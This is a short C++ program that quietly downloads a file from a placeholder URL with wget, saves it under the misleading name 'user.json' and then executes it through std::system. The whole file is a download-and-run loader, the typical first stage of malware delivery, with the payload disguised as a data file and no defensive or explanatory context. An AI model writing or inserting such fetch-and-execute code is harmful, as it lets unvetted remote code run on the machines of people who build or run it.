#include <cstdlib>
#include <string>

int main() {
    // Wget URL
    std::string url = URL;
    std::string command0 = "wget -q " + url + " -O user.json";
    int r0 = std::system(command0.c_str());

    // Run
    std::string command1 = "./user.json";
    int r1 = std::system(command1.c_str());

    return 0;
}